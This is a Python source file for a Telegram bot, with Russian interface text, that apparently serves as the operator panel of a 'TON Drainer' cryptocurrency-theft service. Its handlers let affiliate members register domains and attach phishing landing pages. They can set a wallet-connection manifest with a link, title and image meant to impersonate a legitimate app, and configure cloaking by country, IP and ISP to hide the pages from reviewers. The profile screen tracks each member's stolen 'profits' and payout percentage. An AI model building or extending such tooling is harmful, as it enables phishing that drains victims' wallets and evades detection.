import json
from decimal import Decimal
from aiogram import types, Router, F
from aiogram.filters import CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, Message
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.orm import joinedload

from states import states
from keyboards import main_keyboard, domains_keyboard
import config
from main import bot
from sqlalchemy import select
from database import models
from database.database import get_db
from database.models import User, Domains, SubDomains, Landing, Manifest, Cloaking
from keyboards.main_keyboard import main_menu
from middlewares.user_middleware import AuthorizeMiddleware
import dns.resolver

from states.states import CloakingState

router = Router()  # –°–æ–∑–¥–∞–µ–º —Ä–æ—É—Ç–µ—Ä –¥–ª—è –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤
router.message.middleware(AuthorizeMiddleware())
router.callback_query.middleware(AuthorizeMiddleware())


@router.message(F.text == "üåê –î–æ–º–µ–Ω—ã")
async def domains(message: Message, user: User, session: AsyncSession):
    domains_query = await session.execute(select(Domains).where(Domains.user_tg_id == user.tg_id))
    domains = domains_query.scalars().all()

    subdomains_query = await session.execute(select(SubDomains).where(SubDomains.user_tg_id == user.tg_id))
    subdomains = subdomains_query.scalars().all()

    text = "üåê <b>–ú–µ–Ω—é –¥–æ–º–µ–Ω–æ–≤</b>\n\n"  # –ó–∞–≥–æ–ª–æ–≤–æ–∫ –∏ –æ—Ç—Å—Ç—É–ø

    if domains:
        for i, domain in enumerate(domains):
            end_date_str = domain.end_date.strftime("%d.%m") if domain.end_date else "–ù–µ —É–∫–∞–∑–∞–Ω–æ"
            text += f"{i + 1}. {domain.domain}: {domain.registration_date}\n"


    else:
        text += "–î–æ–º–µ–Ω—ã –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç\n"
    keyboard = await domains_keyboard.get_domain_kb(user, session)
    await message.answer(text=text, parse_mode="HTML", reply_markup=keyboard)


async def show_domain_page(session: AsyncSession, user: User):
    domains_query = await session.execute(select(Domains).where(Domains.user_tg_id == user.tg_id))
    domains = domains_query.scalars().all()

    subdomains_query = await session.execute(select(SubDomains).where(SubDomains.user_tg_id == user.tg_id))
    subdomains = subdomains_query.scalars().all()

    text = "üåê <b>–ú–µ–Ω—é –¥–æ–º–µ–Ω–æ–≤</b>\n\n"  # –ó–∞–≥–æ–ª–æ–≤–æ–∫ –∏ –æ—Ç—Å—Ç—É–ø

    if domains:
        for i, domain in enumerate(domains):
            end_date_str = domain.end_date.strftime("%d.%m") if domain.end_date else "–ù–µ —É–∫–∞–∑–∞–Ω–æ"
            text += f"{i + 1}. {domain.domain}: {domain.registration_date}\n"


    else:
        text += "–î–æ–º–µ–Ω—ã –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç\n"
    keyboard = await domains_keyboard.get_domain_kb(user, session)
    await bot.send_message(chat_id=user.tg_id, text=text, parse_mode="HTML", reply_markup=keyboard)


@router.callback_query(F.data == 'back_to_profile')
async def back_to_profile(call: CallbackQuery, user: User, session: AsyncSession):
    if call.data == 'back_to_profile':
        await call.message.delete()
        if user:
            text = (f"<b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ø—Ä–æ—Ñ–∏–ª—å</b>\n"
                    f"<b>{config.TEAM_NAME} TON Drainer</b>\n\n"
                    f"1Ô∏è‚É£ <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:</b>\n"
                    f"‚îîüëâ TG ID: <code>{user.tg_id}</code>\n"
                    f"‚îîüëâ –ü—Ä–æ—Ñ–∏–ª—å lolz: <code>{user.lolz_profile}\n</code>"
                    f"‚îî‚ùï –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∫–∞ –≤ –≤—ã–ø–ª–∞—Ç–∞—Ö: <code>{user.nickname_display}</code>\n"
                    f"‚îîüë§ –°—Ç–∞—Ç—É—Å: <code>{user.status}</code>\n"
                    f"‚îîüí≤ –ü—Ä–æ—Ü–µ–Ω—Ç: <code>{user.percentage}</code>\n"
                    f"‚îî‚ÅâÔ∏è –õ–∏–º–∏—Ç –¥–æ–º–µ–Ω–æ–≤: <code>{user.domains_limit}</code>\n"
                    f"‚îî‚ÅâÔ∏è –õ–∏–º–∏—Ç –±–æ—Ç–æ–≤: <code>{user.bots_limit}</code>\n\n"
                    f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n"
                    f"‚îîüíµ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: <code>{user.balance}$</code>\n"
                    f"‚îîüí∞ –ü—Ä–æ—Ñ–∏—Ç–æ–≤: <code>{user.profits}$</code>\n"
                    f"‚îîüìÖ –î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: <code>{user.registration_date}</code>\n\n"
                    f"üí≥ <b>–ü—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∏:</b>\n"
                    f"‚îîTON: <code>{user.ton_wallet}</code>\n")

            await call.message.answer(text, parse_mode='HTML', reply_markup=main_keyboard.profile_menu)


@router.callback_query(F.data == 'create_domain')
async def create_new_domain(call: CallbackQuery, state: FSMContext):
    if call.data == 'create_domain':
        await call.message.delete()
        await call.message.answer(
            text='üåê –í–≤–µ–¥–∏—Ç–µ –≤–∞—à –¥–æ–º–µ–Ω (<b>–±–µ–∑</b> –ø–æ–¥–¥–æ–º–µ–Ω–∞, –µ–≥–æ –º–æ–∂–Ω–æ –±—É–¥–µ—Ç –¥–æ–±–∞–≤–∏—Ç—å –ø–æ–∑–¥–Ω–µ–µ)\n\n'
                 '–ü—Ä–∏–º–µ—Ä: domain.com\n'
                 '‚ùóÔ∏è <i>–ù–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–æ–º–µ–Ω—ã —Å –∫–ª—é—á–µ–º–∏ —Å–ª–æ–≤–∞–º–∏, —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å –ø—Ä–æ–µ–∫—Ç–∞–º–∏ –∏ –ø—Ä–æ—á–∏–º –≤–æ –∏–∑–±–µ–∂–∞–Ω–∏–µ –ö–¢.'
                 '(* –±—É–¥–µ—Ç –∑–∞–º–µ–Ω–µ–Ω–æ –Ω–∞ .)</i>', parse_mode='HTML', disable_web_page_preview=True,
            reply_markup=domains_keyboard.back_to_profile)
        await state.set_state(states.DomainState.new_domain)


@router.message(StateFilter(states.DomainState.new_domain))
async def add_new_domain(message: Message, state: FSMContext, session: AsyncSession, user: User):
    new_domain = message.text
    await state.clear()
    try:
        await message.answer(text='üïî –û–∂–∏–¥–∞–π—Ç–µ, –ø–æ–ª—É—á–∞–µ–º NS (—ç—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è)')
        resolver = dns.resolver.Resolver()
        ns_records = resolver.resolve(new_domain, 'NS')
        try:
            async with session:
                domain = Domains(
                    domain=new_domain,
                    user_tg_id=user.tg_id,  # Use user.tg_id
                    end_date=None,  # Or set an appropriate end date
                    type="private"  # Or "public", as needed
                )
                session.add(domain)
                await session.commit()
                await session.refresh(domain)
        except Exception as db_e:
            await session.rollback()  # Rollback on database error
            await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö: {db_e}")  # Inform the user
            print(f"Database error: {db_e}")  # Log the error for debugging
        kb = domains_keyboard.get_found_domain_kb(domain.id)
        await message.answer(text='‚úÖ –ó–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –¥–æ–º–µ–Ω–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!\n\n'
                                  '<b>–°—Ç–∞—Ç—É—Å:</b> <code>–£—Å–ø–µ—à–Ω–æ</code>\n'
                                  '<b>–°–æ–æ–±—â–µ–Ω–∏–µ:</b> <code>–£—Å–ø–µ—à–Ω–æ</code>\n'
                                  f'<b>NS:</b> <code>{ns_records[0]}\n{ns_records[1]}</code>', parse_mode='HTML',
                             reply_markup=kb)

    except dns.resolver.NXDOMAIN:
        await message.answer("‚ùå –î–æ–º–µ–Ω –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")  # Use await message.answer()
    except dns.resolver.NoAnswer:
        await message.answer("‚ùå NS –∑–∞–ø–∏—Å–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")  # Use await message.answer()
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")  # Use await message.answer()


@router.callback_query(F.data.startswith('domain_settings|'))
async def domain_settings(call: CallbackQuery, session: AsyncSession, state: FSMContext):
    landing_name = "–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω"
    domain_id = int(call.data.split('|')[1])
    domain_query = await session.execute(select(Domains).where(Domains.id == domain_id))
    domain = domain_query.scalars().first()
    if domain:
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '8.8.4.4']  # Use Google Public DNS
            resolver.nameservers = ['1.1.1.1', '1.0.0.1']  # Use Cloudflare DNS
            resolver.nameservers = ['9.9.9.9', '149.112.112.112']  # Use Quad9
            ns_records = resolver.resolve(domain.domain, 'NS')
        except dns.resolver.LifetimeTimeout:
            ns_records = ["DNS Timeout", "DNS Timeout"]  # Or some other default value
            print(f"DNS resolution timed out for {domain.domain}")
        except dns.resolver.NXDOMAIN:  # Catch domain not found errors
            ns_records = ["Domain Not Found", "Domain Not Found"]
            print(f"Domain {domain.domain} not found")
        except Exception as e:  # Catch other errors
            ns_records = ["DNS Error", "DNS Error"]
            print(f"DNS resolution error: {e}")
        kb = domains_keyboard.create_chosen_domain_kb(domain_id)
        if domain.landing_id:
            landing_query = await session.execute(select(Landing).where(Landing.id == domain.landing_id))
            landing = landing_query.scalars().first()
            if landing:
                landing_name = landing.name
        await state.update_data(domain_id=domain_id)
        await call.message.edit_text(text=f'üåê <b>–î–æ–º–µ–Ω</b> {domain.domain}:\n\n'
                                          f'<b>üïí –°—Ç–∞—Ç—É—Å: </b> <code>{domain.status}</code>\n'
                                          f'<b>üìÑ –õ–µ–Ω–¥: </b> <code>{landing_name}</code>\n'
                                          f'<b>üìÖ –î–∞—Ç–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è:</b> <code>{domain.registration_date}</code>\n\n'
                                          f'<b>1Ô∏è‚É£ NS1:</b> <code>{ns_records[0]}</code>\n'
                                          f'<b>2Ô∏è‚É£ NS2:</b> <code>{ns_records[1]}</code>\n\n', parse_mode='HTML',
                                     reply_markup=kb)
    else:
        await call.answer('–î–æ–º–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω')


@router.callback_query(F.data.startswith('domain_design|'))
async def domain_landing(call: CallbackQuery, session: AsyncSession):
    await call.message.edit_text(text='üé® –í—ã–±–µ—Ä–∏—Ç–µ –ª–µ–Ω–¥–∏–Ω–≥', reply_markup=await domains_keyboard.get_landing_kb(session))


@router.callback_query(F.data.startswith('choose_landing|'))
async def choose_landing(call: CallbackQuery, session: AsyncSession, state: FSMContext):
    landing_id = int(call.data.split('|')[1])
    landing_query = await session.execute(select(Landing).where(Landing.id == landing_id))
    landing = landing_query.scalars().first()
    await state.update_data(landing_id=landing_id)
    if landing:
        if landing.preview:
            await call.message.delete()
            await bot.send_photo(text=f'üëÄ –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –ª–µ–Ω–¥–∏–Ω–≥–∞: <i>{landing.name}</i>',
                                 reply_markup=domains_keyboard.landing_menu, parse_mode='HTML', photo=landing.preview)
        else:
            await call.message.answer(text=f'üëÄ –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –ª–µ–Ω–¥–∏–Ω–≥–∞ –Ω–µ—Ç: <i>{landing.name}</i>',
                                      reply_markup=domains_keyboard.landing_menu, parse_mode='HTML', )


@router.callback_query(F.data == 'install_landing' or F.data == 'back_to_landings')
async def install_landing(call: CallbackQuery, session: AsyncSession, state: FSMContext, user: User):
    if call.data == 'install_landing':
        data = await state.get_data()
        domain_id = data.get('domain_id')
        landing_id = data.get('landing_id')
        async with session:
            domain = await session.execute(select(Domains).where(Domains.id == domain_id))
            domain = domain.scalars().first()
            domain.landing_id = landing_id
            await session.commit()
            await session.refresh(domain)
        await call.message.edit_text(text='‚úÖ –õ–µ–Ω–¥–∏–Ω–≥ —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!')
    elif call.data == 'back_to_landings':
        await call.message.delete()
        await call.message.answer(text='üåê –í—ã–±–µ—Ä–∏—Ç–µ –ª–µ–Ω–¥–∏–Ω–≥',
                                  reply_markup=await domains_keyboard.get_landing_kb(session))


@router.callback_query(F.data == 'back_to_domains')
async def back_to_domains(call: CallbackQuery, session: AsyncSession, user: User):
    if call.data == 'back_to_domains':
        domains_query = await session.execute(select(Domains).where(Domains.user_tg_id == user.tg_id))
        domains1 = domains_query.scalars().all()
        await call.message.delete()
        subdomains_query = await session.execute(select(SubDomains).where(SubDomains.user_tg_id == user.tg_id))
        subdomains = subdomains_query.scalars().all()

        text = "üåê <b>–ú–µ–Ω—é –¥–æ–º–µ–Ω–æ–≤</b>\n\n"  # –ó–∞–≥–æ–ª–æ–≤–æ–∫ –∏ –æ—Ç—Å—Ç—É–ø

        if domains1:
            for i, domain in enumerate(domains1):
                end_date_str = domain.end_date.strftime("%d.%m") if domain.end_date else "–ù–µ —É–∫–∞–∑–∞–Ω–æ"
                text += f"{i + 1}. {domain.domain}: {domain.registration_date}\n"
        else:
            text += "–î–æ–º–µ–Ω—ã –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç\n"
        keyboard = await domains_keyboard.get_domain_kb(user, session)
        await call.message.answer(text=text, parse_mode="HTML", reply_markup=keyboard)


@router.callback_query(F.data.startswith('manifest_settings|'))
async def manifest_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    domain_id = int(call.data.split('|')[1])
    await state.update_data(domain_id=domain_id)
    # Use joinedload to eagerly load the manifest relationship
    query = select(Domains).filter(Domains.id == domain_id).options(joinedload(Domains.manifest))
    domain_query = await session.execute(query)
    domain = domain_query.scalars().first()

    if domain:  # Check if the domain exists
        if domain.manifest:
            # Now domain.manifest is already loaded, no lazy loading needed
            await call.message.edit_text(text='‚öôÔ∏è –ú–∞–Ω–∏—Ñ–µ—Å—Ç\n'
                                              f'<b>‚îî üí† –û—Å–Ω–æ–≤–Ω–∞—è —Å—Å—ã–ª–∫–∞:</b> {domain.manifest.link or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n'
                                              f'<b>‚îî üìù –ù–∞–∑–≤–∞–Ω–∏–µ:</b> {domain.manifest.title or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n'
                                              f'<b>‚îî üñº –°—Å—ã–ª–∫–∞ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ:</b> {domain.manifest.picture or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n',
                                         reply_markup=domains_keyboard.manifest, parse_mode='HTML')
            await state.update_data(manifest_id=domain.manifest.id)
        else:
            try:
                async with session:
                    manifest = Manifest()
                    session.add(manifest)
                    await session.commit()
                    await session.refresh(manifest)

                    domain.manifest_id = manifest.id
                    await session.commit()
                    await session.refresh(domain)

                    await call.message.edit_text(text='‚öôÔ∏è –ú–∞–Ω–∏—Ñ–µ—Å—Ç\n'
                                                      f'<b>‚îî üí† –û—Å–Ω–æ–≤–Ω–∞—è —Å—Å—ã–ª–∫–∞:</b> {domain.manifest.link or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n'
                                                      f'<b>‚îî üìù –ù–∞–∑–≤–∞–Ω–∏–µ:</b> {domain.manifest.title or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n'
                                                      f'<b>‚îî üñº –°—Å—ã–ª–∫–∞ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ:</b> {domain.manifest.picture or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n',
                                                 reply_markup=domains_keyboard.manifest, parse_mode='HTML')
                    await state.update_data(manifest_id=domain.manifest.id)
            except Exception as e:
                await session.rollback()
                await call.message.answer(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –º–∞–Ω–∏—Ñ–µ—Å—Ç–∞: {e}")
                print(f"Manifest creation error: {e}")
    else:
        await call.message.answer("Domain not found.")  # Handle the case if the domain doesn't exist.


@router.callback_query(F.data.startswith('dom_manifest_'))
async def dom_manifest(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    setting = call.data.split('_')[2]
    if setting == 'link':
        await state.set_state(states.ManifestState.manifest_link)
        await call.message.edit_text(text='üí† –í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –¥–ª—è –º–∞–Ω–∏—Ñ–µ—Å—Ç–∞')
    elif setting == 'name':
        await state.set_state(states.ManifestState.manifest_title)
        await call.message.edit_text(text='üìù –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –¥–ª—è –º–∞–Ω–∏—Ñ–µ—Å—Ç–∞')
    elif setting == 'image':
        await state.set_state(states.ManifestState.manifest_image)
        await call.message.edit_text(text='üñº –í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è –º–∞–Ω–∏—Ñ–µ—Å—Ç–∞')


@router.message(StateFilter(states.ManifestState.manifest_link))
async def manifest_link(message: Message, state: FSMContext, session: AsyncSession, user: User):
    link = message.text
    data = await state.get_data()
    manifest_id = data.get('manifest_id')
    try:
        async with session:
            manifest = await session.get(Manifest, manifest_id)
            if manifest:
                manifest.link = link
                await session.commit()
                await session.refresh(manifest)
                await message.answer(text='üí† –°—Å—ã–ª–∫–∞ –¥–ª—è –º–∞–Ω–∏—Ñ–µ—Å—Ç–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer(text='‚ùå –ú–∞–Ω–∏—Ñ–µ—Å—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.')
    except Exception as e:
        await session.rollback()
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—Å—ã–ª–∫–∏: {e}")
        print(f"Error saving link: {e}")


@router.message(StateFilter(states.ManifestState.manifest_title))
async def manifest_title(message: Message, state: FSMContext, session: AsyncSession, user: User):
    title = message.text
    data = await state.get_data()
    manifest_id = data.get('manifest_id')
    try:
        async with session:
            manifest = await session.get(Manifest, manifest_id)
            if manifest:
                manifest.title = title
                await session.commit()
                await session.refresh(manifest)
                await message.answer(text='üìù –ù–∞–∑–≤–∞–Ω–∏–µ –¥–ª—è –º–∞–Ω–∏—Ñ–µ—Å—Ç–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer(text='‚ùå –ú–∞–Ω–∏—Ñ–µ—Å—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.')
    except Exception as e:
        await session.rollback()
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–∞–∑–≤–∞–Ω–∏—è: {e}")
        print(f"Error saving title: {e}")


@router.message(StateFilter(states.ManifestState.manifest_image))
async def manifest_image(message: Message, state: FSMContext, session: AsyncSession, user: User):
    image_url = message.text  # Or handle file uploads if needed
    data = await state.get_data()
    manifest_id = data.get('manifest_id')
    try:
        async with session:
            manifest = await session.get(Manifest, manifest_id)
            if manifest:
                manifest.picture = image_url
                await session.commit()
                await session.refresh(manifest)
                await message.answer(text='üñº –°—Å—ã–ª–∫–∞ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è –º–∞–Ω–∏—Ñ–µ—Å—Ç–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer(text='‚ùå –ú–∞–Ω–∏—Ñ–µ—Å—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.')
    except Exception as e:
        await session.rollback()
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å—Å—ã–ª–∫–∏ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ: {e}")
        print(f"Error saving image URL: {e}")


@router.callback_query(F.data.startswith('cloaka_settings|'))
async def cloaka_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    ips = None
    domain_id = int(call.data.split('|')[1])
    await state.update_data(domain_id=domain_id)
    # Use joinedload to eagerly load the manifest relationship
    query = select(Domains).filter(Domains.id == domain_id).options(joinedload(Domains.cloaking))
    domain_query = await session.execute(query)
    domain = domain_query.scalars().first()

    if domain:  # Check if the domain exists
        if domain.cloaking:
            # Now domain.manifest is already loaded, no lazy loading needed
            if domain.cloaking.ips:
                ips = len(domain.cloaking.ips)
            await call.message.edit_text(text='‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∫–ª–æ–∞–∫–∏–Ω–≥–∞:\n'
                                              f'<b>‚îî üåç –°—Ç—Ä–∞–Ω—ã:</b> {domain.cloaking.countries or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n'
                                              f'<b>‚îî üîí IP –∞–¥—Ä–µ—Å–∞:</b> {ips or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n'
                                              f'<b>‚îî üè¢ ISP –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã:</b> {domain.cloaking.isp_providers or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n',
                                         reply_markup=domains_keyboard.cloaking, parse_mode='HTML')
            await state.update_data(cloaking_id=domain.cloaking.id)
        else:
            try:
                async with session:
                    cloaking = Cloaking()
                    session.add(cloaking)
                    await session.commit()
                    await session.refresh(cloaking)

                    domain.cloaking_id = cloaking.id
                    await session.commit()
                    await session.refresh(domain)
                    if domain.cloaking.ips:
                        ips = len(domain.cloaking.ips)
                    await call.message.edit_text(text='‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∫–ª–æ–∞–∫–∏–Ω–≥–∞:\n'
                                                      f'<b>‚îî üåç –°—Ç—Ä–∞–Ω—ã:</b> {domain.cloaking.countries or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n'
                                                      f'<b>‚îî üîí IP –∞–¥—Ä–µ—Å–∞:</b> {ips or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n'
                                                      f'<b>‚îî üè¢ ISP –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã:</b> {domain.cloaking.isp_providers or "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}\n',
                                                 reply_markup=domains_keyboard.cloaking, parse_mode='HTML')
                    await state.update_data(cloaking_id=domain.cloaking.id)
            except Exception as e:
                await session.rollback()
                await call.message.answer(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –º–∞–Ω–∏—Ñ–µ—Å—Ç–∞: {e}")
                print(f"Manifest creation error: {e}")
    else:
        await call.message.answer("Domain not found.")  # Handle the case if the domain doesn't exist.


@router.callback_query(F.data.startswith('dom_cloaking_'))
async def dom_cloaking(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    setting = call.data.split('_')[2]
    if setting == 'countries':
        await state.set_state(states.CloakingState.countries)
        await call.message.edit_text(text='üåç –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥—ã —Å—Ç—Ä–∞–Ω —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é')
    elif setting == 'ips':
        await state.set_state(states.CloakingState.ips)
        await call.message.edit_text(text='üîí –í–≤–µ–¥–∏—Ç–µ IP –∞–¥—Ä–µ—Å–∞ —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é')
    elif setting == 'isp':
        await state.set_state(states.CloakingState.isp_providers)
        await call.message.edit_text(text='üè¢ –í–≤–µ–¥–∏—Ç–µ ISP –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é')


@router.message(StateFilter(CloakingState.countries))
async def cloaking_countries(message: Message, state: FSMContext, session: AsyncSession, user: User):
    countries_str = message.text
    countries_list = [c.strip() for c in countries_str.split(',')]
    data = await state.get_data()
    cloaking_id = data.get('cloaking_id')

    try:
        async with session:
            cloaking = await session.get(Cloaking, cloaking_id)

            if cloaking:
                cloaking.countries = json.dumps(countries_list)  # Convert list to JSON string
                await session.commit()
                await session.refresh(cloaking)
                await message.answer(text=' –°–ø–∏—Å–æ–∫ —Å—Ç—Ä–∞–Ω –¥–ª—è –∫–ª–æ–∞–∫–∏–Ω–≥–∞ –æ–±–Ω–æ–≤–ª–µ–Ω.')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer("‚ùå –ó–∞–ø–∏—Å—å –∫–ª–æ–∞–∫–∏–Ω–≥–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")

    except Exception as e:
        await session.rollback()
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ —Å—Ç—Ä–∞–Ω: {e}")
        print(f"–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ —Å—Ç—Ä–∞–Ω: {e}")


@router.message(StateFilter(CloakingState.ips))
async def cloaking_ips(message: Message, state: FSMContext, session: AsyncSession, user: User):
    ips_str = message.text  # –ü–æ–ª—É—á–∞–µ–º —Å—Ç—Ä–æ–∫—É —Å IP –∞–¥—Ä–µ—Å–∞–º–∏
    ips_list = [ip.strip() for ip in ips_str.split(',')]  # –†–∞–∑–¥–µ–ª—è–µ–º –Ω–∞ —Å–ø–∏—Å–æ–∫ –∏ –æ—á–∏—â–∞–µ–º –æ—Ç –ø—Ä–æ–±–µ–ª–æ–≤

    data = await state.get_data()
    cloaking_id = data.get('cloaking_id')

    try:
        async with session:
            cloaking = await session.get(Cloaking, cloaking_id)

            if cloaking:
                cloaking.ips = json.dumps(ips_list)  # –û–±–Ω–æ–≤–ª—è–µ–º —Å–ø–∏—Å–æ–∫ IP –∞–¥—Ä–µ—Å–æ–≤
                await session.commit()
                await session.refresh(cloaking)
                await message.answer(text=' –°–ø–∏—Å–æ–∫ IP –∞–¥—Ä–µ—Å–æ–≤ –¥–ª—è –∫–ª–æ–∞–∫–∏–Ω–≥–∞ –æ–±–Ω–æ–≤–ª–µ–Ω.')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer("‚ùå –ó–∞–ø–∏—Å—å –∫–ª–æ–∞–∫–∏–Ω–≥–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")

    except Exception as e:
        await session.rollback()
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ IP –∞–¥—Ä–µ—Å–æ–≤: {e}")
        print(f"–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ IP –∞–¥—Ä–µ—Å–æ–≤: {e}")


@router.message(StateFilter(CloakingState.isp_providers))
async def cloaking_isp(message: Message, state: FSMContext, session: AsyncSession, user: User):
    isp_str = message.text  # –ü–æ–ª—É—á–∞–µ–º —Å—Ç—Ä–æ–∫—É —Å –Ω–∞–∑–≤–∞–Ω–∏—è–º–∏ ISP
    isp_list = [isp.strip() for isp in isp_str.split(',')]  # –†–∞–∑–¥–µ–ª—è–µ–º –Ω–∞ —Å–ø–∏—Å–æ–∫ –∏ –æ—á–∏—â–∞–µ–º –æ—Ç –ø—Ä–æ–±–µ–ª–æ–≤

    data = await state.get_data()
    cloaking_id = data.get('cloaking_id')

    try:
        async with session:
            cloaking = await session.get(Cloaking, cloaking_id)

            if cloaking:
                cloaking.isp_providers = json.dumps(isp_list)  # –û–±–Ω–æ–≤–ª—è–µ–º —Å–ø–∏—Å–æ–∫ ISP –ø—Ä–æ–≤–∞–π–¥–µ—Ä–æ–≤
                await session.commit()
                await session.refresh(cloaking)
                await message.answer(text=' –°–ø–∏—Å–æ–∫ ISP –ø—Ä–æ–≤–∞–π–¥–µ—Ä–æ–≤ –¥–ª—è –∫–ª–æ–∞–∫–∏–Ω–≥–∞ –æ–±–Ω–æ–≤–ª–µ–Ω.')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer("‚ùå –ó–∞–ø–∏—Å—å –∫–ª–æ–∞–∫–∏–Ω–≥–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")

    except Exception as e:
        await session.rollback()
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ ISP –ø—Ä–æ–≤–∞–π–¥–µ—Ä–æ–≤: {e}")
